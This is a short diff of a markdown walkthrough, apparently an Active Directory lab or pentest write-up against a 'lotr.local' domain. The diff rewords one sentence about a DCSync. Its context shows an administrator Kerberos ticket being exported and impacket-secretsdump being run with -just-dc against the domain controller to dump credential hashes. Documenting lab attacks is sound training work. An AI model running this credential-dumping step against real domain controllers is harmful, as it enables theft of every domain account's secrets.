@@ -46,7 +46,7 @@ The ticket was then exported in kali
 └─# export KRB5CCNAME=administrator.ccache
 ```
 
-The DCSync was performed. Impacket connected to the domain controller via smb to perform the DCSync.
+The DCSync was performed using the ticket. Impacket connected to the domain controller via smb to perform the DCSync.
 ```
 ┌──(root㉿kali)-[~/impacket/examples]
 └─# impacket-secretsdump -k dc.lotr.local -just-dc
